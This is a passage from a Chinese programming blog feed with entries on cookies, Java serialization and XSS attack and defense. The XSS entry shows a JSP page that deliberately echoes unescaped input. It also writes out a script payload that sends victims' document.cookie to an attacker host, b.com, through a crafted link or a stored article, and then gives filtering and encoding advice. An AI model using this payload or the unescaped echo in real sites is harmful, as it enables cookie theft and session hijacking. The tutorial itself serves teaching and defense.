    <summary type="html"><![CDATA[<p>最近在公司做了Web端单点登录(SSO)功能，基于Cookie实现，做完之后感觉有必要总结一下，本文着重讲解Cookie，下文会说明单点登录的实现方案。</p>
<p><strong>Cookie简介</strong></p>
<p>众所周知，Web协议（也就是HTTP）是一个无状态的协议（HTTP1.0）。一个Web应用由很多个Web页面组成，每个页面都有唯一的URL来定义。用户在浏览器的地址栏输入页面的URL，浏览器就会向Web Server去发送请求。如下图，浏览器向Web服务器发送了两个请求，申请了两个页面。这两个页面的请求是分别使用了两个单独的HTTP连接。所谓无状态的协议也就是表现在这里，浏览器和Web服务器会在第一个请求完成以后关闭连接通道，在第二个请求的时候重新建立连接。Web服务器并不区分哪个请求来自哪个客户端，对所有的请求都一视同仁，都是单独的连接。这样的方式大大区别于传统的（Client/Server）C/S结构,在那样的应用中，客户端和服务器端会建立一个长时间的专用的连接通道。正是因为有了无状态的特性，每个连接资源能够很快被其他客户端所重用，一台Web服务器才能够同时服务于成千上万的客户端。<img src="http://img.blog.csdn.net/20140303202645515?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>]]></summary>
    
      <category term="cookie" scheme="http://www.ghsau.com/tags/cookie/"/>
    
      <category term="Java Web" scheme="http://www.ghsau.com/categories/Java%20Web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Java序列化(二)]]></title>
    <link href="http://www.ghsau.com/2014/02/12/java%E5%BA%8F%E5%88%97%E5%8C%96(%E4%BA%8C)/"/>
    <id>http://www.ghsau.com/2014/02/12/java序列化(二)/</id>
    <published>2014-02-12T09:27:00.000Z</published>
    <updated>2014-05-11T15:55:06.000Z</updated>
    <content type="html"><![CDATA[<p>上文中实现了序列化和逆序列化一个简单的Name对象，下面来看一个稍复杂的情况，Name类中复合了其它类。</p>
<p>Name.java：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="code"><pre><span class="keyword">import</span> java.io.Serializable;

<span class="javadoc">/**
 * 可序列化的类，需要实现Serializable接口
 *<span class="javadoctag"> @author</span> 爽
 *
 */</span>
<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Name</span> <span class="keyword">implements</span> <span class="title">Serializable</span> {</span>

	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1</span>L;

	<span class="keyword">private</span> String firstname;
	
	<span class="keyword">private</span> String lastname;
	
	<span class="keyword">private</span> Nickname nickname;
	
	<span class="keyword">public</span> <span class="title">Name</span>() {}

	<span class="keyword">public</span> <span class="title">Name</span>(String firstname, String lastname) {
		<span class="keyword">this</span>.firstname = firstname;
		<span class="keyword">this</span>.lastname = lastname;
	}
	
	<span class="keyword">public</span> <span class="title">Name</span>(String firstname, String lastname, Nickname nickname) {
		<span class="keyword">this</span>.firstname = firstname;
		<span class="keyword">this</span>.lastname = lastname;
		<span class="keyword">this</span>.nickname = nickname;
	}

	<span class="comment">// getter and setter methods</span>

	<span class="annotation">@Override</span>
	<span class="keyword">public</span> String <span class="title">toString</span>() {
		<span class="keyword">return</span> <span class="string">"我的名字是"</span> + firstname + <span class="string">","</span> + lastname + <span class="string">"\n我的昵称是"</span> + nickname;
	}
	
}
</pre></td></tr></table></figure>

<p><a id="more"></a><br>Nickname.java：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="code"><pre><span class="keyword">import</span> java.io.Serializable;

<span class="javadoc">/**
 * 昵称类
 *<span class="javadoctag"> @author</span> 爽
 *
 */</span>
<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Nickname</span> <span class="keyword">implements</span> <span class="title">Serializable</span> {</span>

	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1</span>L;

	<span class="keyword">private</span> String name;

	<span class="keyword">public</span> <span class="title">Nickname</span>() {}

	<span class="keyword">public</span> <span class="title">Nickname</span>(String name) {
		<span class="keyword">this</span>.name = name;
	}

	<span class="comment">// getter and setter methods</span>

	<span class="annotation">@Override</span>
	<span class="keyword">public</span> String <span class="title">toString</span>() {
		<span class="keyword">return</span> name;
	}

}
</pre></td></tr></table></figure>

<p>WriteObject.java：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="code"><pre><span class="keyword">import</span> java.io.IOException;

<span class="keyword">import</span> com.runqianapp.test.bean.Name;
<span class="keyword">import</span> com.runqianapp.test.bean.Nickname;

<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WriteObject</span> {</span>

	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(String[] args) <span class="keyword">throws</span> IOException {
		Nickname nickname = <span class="keyword">new</span> Nickname(<span class="string">"黑曼巴"</span>);
		Name name = <span class="keyword">new</span> Name(<span class="string">"科比"</span>, <span class="string">"布莱恩特"</span>, nickname);
		Serializations.serialize(args[<span class="number">0</span>], name);
	}

}
</pre></td></tr></table></figure>

<p>运行后，指定目录下会生成相应文件，再次运行ReadObject.java，会得到如下输出信息：</p>
<pre><code>我的名字是科比,布莱恩特
我的昵称是黑曼巴
</code></pre><p>在序列化对象时，不仅会序列化当前对象本身，还会对该对象引用的其它对象也进行序列化，同样地，这些其它对象引用的另外对象也将被序列化，以此类推。在序列化过程中，可能会遇到不支持可序列化接口的对象，在此情况下，将抛出 NotSerializableException，并将标识不可序列化对象的类。如将Nickname.java去掉Serializable接口，再次运行WriteObject.java，会抛出如下异常：</p>
<pre><code>Exception <span class="keyword">in</span> thread <span class="string">"main"</span> java<span class="preprocessor">.io</span><span class="preprocessor">.NotSerializableException</span>: Nickname
    at java<span class="preprocessor">.io</span><span class="preprocessor">.ObjectOutputStream</span><span class="preprocessor">.writeObject</span>0(ObjectOutputStream<span class="preprocessor">.java</span>:<span class="number">1180</span>)
    at java<span class="preprocessor">.io</span><span class="preprocessor">.ObjectOutputStream</span><span class="preprocessor">.defaultWriteFields</span>(ObjectOutputStream<span class="preprocessor">.java</span>:<span class="number">1528</span>)
    at java<span class="preprocessor">.io</span><span class="preprocessor">.ObjectOutputStream</span><span class="preprocessor">.writeSerialData</span>(ObjectOutputStream<span class="preprocessor">.java</span>:<span class="number">1493</span>)
    at java<span class="preprocessor">.io</span><span class="preprocessor">.ObjectOutputStream</span><span class="preprocessor">.writeOrdinaryObject</span>(ObjectOutputStream<span class="preprocessor">.java</span>:<span class="number">1416</span>)
    at java<span class="preprocessor">.io</span><span class="preprocessor">.ObjectOutputStream</span><span class="preprocessor">.writeObject</span>0(ObjectOutputStream<span class="preprocessor">.java</span>:<span class="number">1174</span>)
    at java<span class="preprocessor">.io</span><span class="preprocessor">.ObjectOutputStream</span><span class="preprocessor">.writeObject</span>(ObjectOutputStream<span class="preprocessor">.java</span>:<span class="number">346</span>)
    at Serializations<span class="preprocessor">.serialize</span>(Serializations<span class="preprocessor">.java</span>:<span class="number">26</span>)
    at WriteObject<span class="preprocessor">.main</span>(WriteObject<span class="preprocessor">.java</span>:<span class="number">13</span>)
</code></pre><p>我们可以用<span style="color:#993399">transient</span>来修饰nickname属性，这样该类就可以正常序列化了，但是nickname中的属性也就无法序列化了，那我们如何让不能序列化的类NickName中的name属性可以序列化和反序列化呢？在序列化和反序列化过程中需要特殊处理的类必须使用下列准确签名来实现特殊方法：</p>
<pre><code><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span>(java.io.ObjectOutputStream <span class="keyword">out</span>)
    throws IOException;
<span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span>(java.io.ObjectInputStream <span class="keyword">in</span>)
    throws IOException, ClassNotFoundException;
</code></pre><p>在对象序列化时，会调用writeObject方法，在对象反序列化时，会调用readObject方法。writeObject 方法负责写入特定类的对象的状态，以便相应的 readObject 方法可以还原它。通过调用 out.defaultWriteObject 可以调用保存 Object 的字段的默认机制。readObject 方法负责从流中读取并还原类字段。它可以调用 in.defaultReadObject 来调用默认机制，以还原对象的非静态和非瞬态字段。所以，我们可以在Name类中加入如下方法：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="code"><pre><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span>(java.io.ObjectOutputStream <span class="keyword">out</span>)
		 throws IOException {
	<span class="comment">// 默认序列化机制</span>
	<span class="keyword">out</span>.defaultWriteObject();
	<span class="comment">// 序列化nickname中的name属性</span>
	<span class="keyword">out</span>.writeObject(nickname.getName());
}

<span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span>(java.io.ObjectInputStream <span class="keyword">in</span>)
		 throws IOException, ClassNotFoundException {
	<span class="comment">// 默认逆序列化机制</span>
	<span class="keyword">in</span>.defaultReadObject();
	<span class="comment">// 逆序列化一个nickname对象</span>
	nickname = <span class="keyword">new</span> Nickname(<span class="keyword">in</span>.readObject().toString());
}
</pre></td></tr></table></figure>

<p>这样就可以处理其不可序列化的复合类Nickname中的name属性序列化及反序列化。运行WriteObject和ReadObject，序列化和反序列化成功。这两个方法如何实现取决于最终的需求，上面的例子是我想的一个比较符合应用场景的实例。</p>
]]></content>
    <summary type="html"><![CDATA[<p>上文中实现了序列化和逆序列化一个简单的Name对象，下面来看一个稍复杂的情况，Name类中复合了其它类。</p>
<p>Name.java：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="code"><pre><span class="keyword">import</span> java.io.Serializable;

<span class="javadoc">/**
 * 可序列化的类，需要实现Serializable接口
 *<span class="javadoctag"> @author</span> 爽
 *
 */</span>
<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Name</span> <span class="keyword">implements</span> <span class="title">Serializable</span> {</span>

	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1</span>L;

	<span class="keyword">private</span> String firstname;
	
	<span class="keyword">private</span> String lastname;
	
	<span class="keyword">private</span> Nickname nickname;
	
	<span class="keyword">public</span> <span class="title">Name</span>() {}

	<span class="keyword">public</span> <span class="title">Name</span>(String firstname, String lastname) {
		<span class="keyword">this</span>.firstname = firstname;
		<span class="keyword">this</span>.lastname = lastname;
	}
	
	<span class="keyword">public</span> <span class="title">Name</span>(String firstname, String lastname, Nickname nickname) {
		<span class="keyword">this</span>.firstname = firstname;
		<span class="keyword">this</span>.lastname = lastname;
		<span class="keyword">this</span>.nickname = nickname;
	}

	<span class="comment">// getter and setter methods</span>

	<span class="annotation">@Override</span>
	<span class="keyword">public</span> String <span class="title">toString</span>() {
		<span class="keyword">return</span> <span class="string">"我的名字是"</span> + firstname + <span class="string">","</span> + lastname + <span class="string">"\n我的昵称是"</span> + nickname;
	}
	
}
</pre></td></tr></table></figure>

<p>]]></summary>
    
      <category term="序列化" scheme="http://www.ghsau.com/tags/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="Java SE" scheme="http://www.ghsau.com/categories/Java%20SE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Java序列化(一)]]></title>
    <link href="http://www.ghsau.com/2014/01/28/java%E5%BA%8F%E5%88%97%E5%8C%96(%E4%B8%80)/"/>
    <id>http://www.ghsau.com/2014/01/28/java序列化(一)/</id>
    <published>2014-01-28T12:58:00.000Z</published>
    <updated>2014-05-13T10:54:04.000Z</updated>
    <content type="html"><![CDATA[<p>Java序列化，一个日常开发中比较少用到的技术。正常情况下，JVM启动后，我们可以创建对象生存其内，JVM关闭后，我们创建过的对象都随之销毁，资源释放。但有些时候可能要求在JVM停止之后，某些对象需要保存起来，以便将来再重新读取它们。举个例子，应用服务器的HttpSession对象，Session是指浏览器与服务器之间的一次会话，对应的是服务器中的一个Session对象，而客户端中保存一个jsessionid，这里回忆一下Session的知识，之前有文章详细的解析过Session，见<a href="http://blog.csdn.net/ghsau/article/details/13023425" target="_blank">Session深度解析</a>。那么当某种情况下，我们不得不重启服务器的时候，就需要把之前所有的Session对象保存起来，服务器重启之后，将这些Session对象再重新加载过来，这样避免了之前浏览器与服务器建立的会话失效，在浏览器那看来，就好象服务器没有关闭过一样(假设服务器重启期间用户没有操作)。这就用到了Java序列化技术，关于这个例子，我们可以拿Tomcat来测试一下，注意要用正常的手段来关闭服务器(shutdown.bat)，而非强制关闭，强制关闭没有序列化的过程。下面来看一个序列化的程序。</p>
<p>首先创建一个可序列化的JavaBean类，Name.java。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="code"><pre><span class="keyword">import</span> java.io.Serializable;

<span class="javadoc">/**
 * 可序列化的类，需要实现Serializable接口
 *<span class="javadoctag"> @author</span> 爽
 *
 */</span>
<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Name</span> <span class="keyword">implements</span> <span class="title">Serializable</span> {</span>

  <span class="keyword">private</span> String firstname;
  
  <span class="keyword">private</span> String lastname;
  
  <span class="keyword">public</span> <span class="title">Name</span>() {
    System.out.println(<span class="string">"无参构造器"</span>);
  }

  <span class="keyword">public</span> <span class="title">Name</span>(String firstname, String lastname) {
    System.out.println(<span class="string">"全参构造器"</span>);
    <span class="keyword">this</span>.firstname = firstname;
    <span class="keyword">this</span>.lastname = lastname;
  }

  <span class="comment">// getter and setter methods</span>
  
  <span class="annotation">@Override</span>
  <span class="keyword">public</span> String <span class="title">toString</span>() {
    <span class="keyword">return</span> <span class="string">"我的名字是"</span> + firstname + <span class="string">","</span> + lastname;
  }
  
}
</pre></td></tr></table></figure>

<a id="more"></a>    

<p>再实现一个序列化的工具类，Serializations.java。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre></td><td class="code"><pre><span class="keyword">import</span> java.io.FileInputStream;
<span class="keyword">import</span> java.io.FileOutputStream;
<span class="keyword">import</span> java.io.IOException;
<span class="keyword">import</span> java.io.ObjectInputStream;
<span class="keyword">import</span> java.io.ObjectOutputStream;

<span class="javadoc">/**
 * 序列化工具类
 *<span class="javadoctag"> @author</span> 爽
 *
 */</span>
<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serializations</span> {</span>

  <span class="javadoc">/**
   * 序列化对象到指定路径文件
   *<span class="javadoctag"> @param</span> outPath 文件路径
   *<span class="javadoctag"> @param</span> outObj 需要序列化的对象
   *<span class="javadoctag"> @throws</span> IOException 当I/O发生异常时
   */</span>
  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span>(String outPath, Object outObj) <span class="keyword">throws</span> IOException {
    ObjectOutputStream oos = <span class="keyword">null</span>;
    <span class="keyword">try</span> {
      oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(outPath));
      oos.writeObject(outObj);
    } <span class="keyword">finally</span> {
      <span class="keyword">if</span>(oos != <span class="keyword">null</span>)    oos.close();
    }
  }
  
  <span class="javadoc">/**
   * 从文件中逆序列化出对象
   *<span class="javadoctag"> @param</span> inPath 文件路径
   *<span class="javadoctag"> @return</span> 你序列化出的对象
   *<span class="javadoctag"> @throws</span> IOException 当I/O发生异常时
   *<span class="javadoctag"> @throws</span> ClassNotFoundException 当文件中不存在序列化的对象时
   */</span>
  <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">deserialize</span>(String inPath) <span class="keyword">throws</span> IOException, ClassNotFoundException {
    ObjectInputStream ois = <span class="keyword">null</span>;
    <span class="keyword">try</span> {
      ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(inPath));
          <span class="keyword">return</span> ois.readObject();
    } <span class="keyword">finally</span> {
      <span class="keyword">if</span>(ois != <span class="keyword">null</span>)    ois.close();
    }
  }
}
</pre></td></tr></table></figure>

<p>最后创建两个个测试类，来使用一下序列化方法和逆序列化方法，WriteObject.java。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre><span class="keyword">import</span> java.io.IOException;

<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WriteObject</span> {</span>

  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(String[] args) <span class="keyword">throws</span> IOException {
    Name name = <span class="keyword">new</span> Name(<span class="string">"科比"</span>, <span class="string">"布莱恩特"</span>);
    Serializations.serialize(args[<span class="number">0</span>], name);
  }

}
</pre></td></tr></table></figure>

<p>运行后，指定目录下会生成相应文件，其内包含了name对象信息。</p>
<p>ReadObject.java。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre>import java.io.IOException;

<span class="keyword">public</span> <span class="keyword">class</span> ReadObject {

  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(String[] args) throws ClassNotFoundException, IOException {
    Object obj = Serializations.deserialize(args[<span class="number">0</span>]);
    System.<span class="keyword">out</span>.println(obj);
  }

}
</pre></td></tr></table></figure>

<p>运行后，输出：</p>
<pre><code>我的名字是科比,布莱恩特
</code></pre><p>我们成功的将name对象序列化到了指定文件中，并且通过逆序列化得到一个和原对象属性相同的对象。注意，逆序列化出的对象没有使用该对象的构造器(由输出结果可以证明)，并且和原对象不相等。<strong>对象的默认序列化机制</strong>：序列化时，对象的类、类的签名，以及类及其所有超类型的非瞬态(non-transient)和非静态(non-static)字段的值都将被写入。逆序列化时，对象的类、类的签名，以及类及其所有超类型的非瞬态(non-transient)和非静态(non-static)字段的值都将被读取。如果我们想某个成员变量不被序列化，可以在其前面加入<strong>transient</strong>关键字。如：</p>
<pre><code><span class="keyword">private</span> <span class="keyword">transient</span> String lastname;
</code></pre><p>如果对象所属类在对象序列化之后做了修改，比如修改属性名称、类型、修饰符等等，再次逆序列化就会发生异常，如我们将lastname前加入<strong>transient</strong>，使用ReadObject.java进行逆序列化，&nbsp;将会抛出如下异常：</p>
<pre><code>Exception <span class="keyword">in</span> thread <span class="string">"main"</span> java<span class="preprocessor">.io</span><span class="preprocessor">.InvalidClassException</span>: Name<span class="comment">; local class incompatible: stream classdesc serialVersionUID = 3999552307707967101, local class serialVersionUID = -4860856635192050881</span>
    at java<span class="preprocessor">.io</span><span class="preprocessor">.ObjectStreamClass</span><span class="preprocessor">.initNonProxy</span>(ObjectStreamClass<span class="preprocessor">.java</span>:<span class="number">604</span>)
    at java<span class="preprocessor">.io</span><span class="preprocessor">.ObjectInputStream</span><span class="preprocessor">.readNonProxyDesc</span>(ObjectInputStream<span class="preprocessor">.java</span>:<span class="number">1601</span>)
    at java<span class="preprocessor">.io</span><span class="preprocessor">.ObjectInputStream</span><span class="preprocessor">.readClassDesc</span>(ObjectInputStream<span class="preprocessor">.java</span>:<span class="number">1514</span>)
    at java<span class="preprocessor">.io</span><span class="preprocessor">.ObjectInputStream</span><span class="preprocessor">.readOrdinaryObject</span>(ObjectInputStream<span class="preprocessor">.java</span>:<span class="number">1750</span>)
    at java<span class="preprocessor">.io</span><span class="preprocessor">.ObjectInputStream</span><span class="preprocessor">.readObject</span>0(ObjectInputStream<span class="preprocessor">.java</span>:<span class="number">1347</span>)
    at java<span class="preprocessor">.io</span><span class="preprocessor">.ObjectInputStream</span><span class="preprocessor">.readObject</span>(ObjectInputStream<span class="preprocessor">.java</span>:<span class="number">369</span>)
    at Serializations<span class="preprocessor">.deserialize</span>(Serializations<span class="preprocessor">.java</span>:<span class="number">43</span>)
    at ReadObject<span class="preprocessor">.main</span>(SerializationsTest<span class="preprocessor">.java</span>:<span class="number">14</span>)
</code></pre><p>异常的大概描述是说流中的类的版本号和本地类的版本号不一致，这里要引入一个序列化版本号(serialVersionUID)的概念，<strong>serialVersionUID</strong>是一个64位的值，在类中需要声明为private static final long，它可以人为来维护，也可以通过<a href="http://docs.oracle.com/javase/6/docs/platform/serialization/spec/class.html#4100" target="_blank">JVM实现的算法</a>来生成，安装JDK后，可以通过%JAVA_HOME%/bin/serialver.exe来生成<span style="font-weight:bold">serialVersionUID</span>。在逆序列化时，会将从对象流中读取的类信息和当前classpath下的相应类的类信息(Name.class)进行比对，比对的媒介就是<span style="font-weight:bold">serialVersionUID</span>，如果对象中没有声明serialVersionUID，那么该值就会通过默认的算法生成，两端不一致时，就会抛出上面的异常，逆序列化失败。</p>
<p>当编写一个可序列化的类时(Name.java)，可以给serialVersionUID赋一个即简单又易理解的值，如：</p>
<pre><code><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1</span>L;
</code></pre><p>如果对该类进行了更改，可能需要同时更新serialVersionUID，如：</p>
<pre><code><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">2</span>L;
</code></pre><p>但有时我们可能即使更改了类之后，仍然要保持之前序列化的可逆性，也就是对之前的序列化文件做个兼容，那么就不能更新serialVersionUID的值，这时更改前生成的序列化文件依然可逆序列化，那么其更新的字段会已字段类型的预设值逆序列化，避开不兼容的问题。</p>
]]></content>
    <summary type="html"><![CDATA[<p>Java序列化，一个日常开发中比较少用到的技术。正常情况下，JVM启动后，我们可以创建对象生存其内，JVM关闭后，我们创建过的对象都随之销毁，资源释放。但有些时候可能要求在JVM停止之后，某些对象需要保存起来，以便将来再重新读取它们。举个例子，应用服务器的HttpSession对象，Session是指浏览器与服务器之间的一次会话，对应的是服务器中的一个Session对象，而客户端中保存一个jsessionid，这里回忆一下Session的知识，之前有文章详细的解析过Session，见<a href="http://blog.csdn.net/ghsau/article/details/13023425" target="_blank">Session深度解析</a>。那么当某种情况下，我们不得不重启服务器的时候，就需要把之前所有的Session对象保存起来，服务器重启之后，将这些Session对象再重新加载过来，这样避免了之前浏览器与服务器建立的会话失效，在浏览器那看来，就好象服务器没有关闭过一样(假设服务器重启期间用户没有操作)。这就用到了Java序列化技术，关于这个例子，我们可以拿Tomcat来测试一下，注意要用正常的手段来关闭服务器(shutdown.bat)，而非强制关闭，强制关闭没有序列化的过程。下面来看一个序列化的程序。</p>
<p>首先创建一个可序列化的JavaBean类，Name.java。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="code"><pre><span class="keyword">import</span> java.io.Serializable;

<span class="javadoc">/**
 * 可序列化的类，需要实现Serializable接口
 *<span class="javadoctag"> @author</span> 爽
 *
 */</span>
<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Name</span> <span class="keyword">implements</span> <span class="title">Serializable</span> {</span>

  <span class="keyword">private</span> String firstname;
  
  <span class="keyword">private</span> String lastname;
  
  <span class="keyword">public</span> <span class="title">Name</span>() {
    System.out.println(<span class="string">"无参构造器"</span>);
  }

  <span class="keyword">public</span> <span class="title">Name</span>(String firstname, String lastname) {
    System.out.println(<span class="string">"全参构造器"</span>);
    <span class="keyword">this</span>.firstname = firstname;
    <span class="keyword">this</span>.lastname = lastname;
  }

  <span class="comment">// getter and setter methods</span>
  
  <span class="annotation">@Override</span>
  <span class="keyword">public</span> String <span class="title">toString</span>() {
    <span class="keyword">return</span> <span class="string">"我的名字是"</span> + firstname + <span class="string">","</span> + lastname;
  }
  
}
</pre></td></tr></table></figure>

]]></summary>
    
      <category term="序列化" scheme="http://www.ghsau.com/tags/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="Java SE" scheme="http://www.ghsau.com/categories/Java%20SE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[XSS攻击及防御]]></title>
    <link href="http://www.ghsau.com/2013/11/29/xss%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1/"/>
    <id>http://www.ghsau.com/2013/11/29/xss攻击及防御/</id>
    <published>2013-11-29T10:35:00.000Z</published>
    <updated>2014-05-24T18:08:22.000Z</updated>
    <content type="html"><![CDATA[<p>XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。<br><!--readmore--></p>
<h1 id="XSS攻击">XSS攻击</h1>
<p>XSS攻击类似于SQL注入攻击，攻击之前，我们先找到一个存在XSS漏洞的网站，XSS漏洞分为两种，一种是DOM Based XSS漏洞，另一种是Stored XSS漏洞。理论上，<strong>所有可输入的地方</strong>没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。</p>
<h2 id="DOM_Based_XSS">DOM Based XSS</h2>
<p>DOM Based XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。</p>
<p><strong>场景一</strong>：</p>
<p>当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="code"><pre><span class="vbscript">&lt;%@ page language=<span class="string">"java"</span>contentType=<span class="string">"text/html; charset=UTF-8"</span>pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span>

<span class="doctype">&lt;!DOCTYPEhtmlPUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd"&gt;</span>

<span class="tag">&lt;<span class="title">html</span>&gt;</span>

    <span class="tag">&lt;<span class="title">head</span>&gt;</span>

       <span class="tag">&lt;<span class="title">title</span>&gt;</span>XSS测试<span class="tag">&lt;/<span class="title">title</span>&gt;</span>

    <span class="tag">&lt;/<span class="title">head</span>&gt;</span>

    <span class="tag">&lt;<span class="title">body</span>&gt;</span>

       页面内容：<span class="vbscript">&lt;%=<span class="built_in">request</span>.getParameter(<span class="string">"content"</span>)%&gt;</span>

    <span class="tag">&lt;/<span class="title">body</span>&gt;</span>

<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
</pre></td></tr></table></figure>

<p>我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：<a href="http://www.a.com?content=&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt;" target="_blank">http://www.a.com?content=&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt;</a>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=&lt;script&gt;alert(“xss”)&lt;/script&gt;，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？</p>
<h2 id="Stored_XSS">Stored XSS</h2>
<p>Stored XSS是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。</p>
<p><strong>场景二</strong>：</p>
<p>a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt;，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。</p>
<p>Stored XSS漏洞危害性更大，危害面更广。</p>
<h1 id="XSS防御">XSS防御</h1>
<p>我们是在一个矛盾的世界中，有矛就有盾。只要我们的代码中不存在漏洞，攻击者就无从下手，我们要做一个没有缝的蛋。XSS防御有如下方式。</p>
<h2 id="完善的过滤体系">完善的过滤体系</h2>
<p>永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。</p>
<h2 id="Html_encode">Html encode</h2>
<p>假如某些情况下，我们不能对用户数据进行严格的过滤，那我们也需要对标签进行转换。</p>
<blockquote>
<p>less-than character (&lt;)——————————————————&amp;lt;</p>
<p>greater-than character (&gt;)——————————————————&amp;gt;  </p>
<p>ampersand character (&amp;)——————————————————&amp;amp;</p>
<p>double-quote character (“)——————————————————&amp;quot;</p>
<p>space character( )——————————————————&amp;nbsp;</p>
<p>Any ASCII code character whose code is greater-than or equal to 0x80——&amp;#[number], where [number] is the ASCII character value.</p>
</blockquote>
